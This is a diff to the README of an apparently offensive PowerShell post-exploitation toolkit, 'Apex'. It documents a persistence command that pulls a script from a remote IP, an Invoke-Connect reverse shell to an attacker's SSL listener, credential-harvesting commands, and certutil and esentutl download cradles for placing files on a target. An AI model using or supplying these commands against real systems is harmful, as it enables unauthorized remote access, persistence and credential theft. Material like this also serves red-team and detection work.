@@ -271,12 +271,14 @@ PS> Invoke-Persistence -StartupLnk -PsFileUrl http://192.168.42.89/script.ps1
 ```
 
 # Available Functions / Commands
+
 ## Invoke-Apex
 ```Invoke-Apex``` (Lists all available functions)
-## Invoke-Connect
-Allows for the transfer of all Invoke-Apex functionality to a remote SSL listener.
 
-Usage: ```Invoke-Connect -lhost 192.168.1.1 -lport 443 -ssl```
+## Invoke-Connect
+Transfers all Apex functionality to a remote SSL listener, and also functions as a non-interactive powershell reverse "shell" if invoked as a stand-alone cmdlet. (SSL-enabled listener is required)
+
+Usage: ```PS> Invoke-Connect -ListenerIp 192.168.1.1 -ListenerPort 443```
 
 ## Invoke-Creds
 Several commands to assist in obtaining credentials from the target host.
@@ -314,6 +316,8 @@ Commands for downloading files to the target system.
 ```-PsDownload``` (Downloads a file to the target system using a traditional powershell 'DownloadFile' cradle.)
 
 ```-CertUtil``` (Uses certutil to download a file to the target system.)
+
+```-EsentUtl``` (Uses Esentutil.exe to download a file from a remote UNC Path.)
 
 ## Invoke-Execute
 Execute commands on a target system using a number of different "living-off-the-land" techniques.
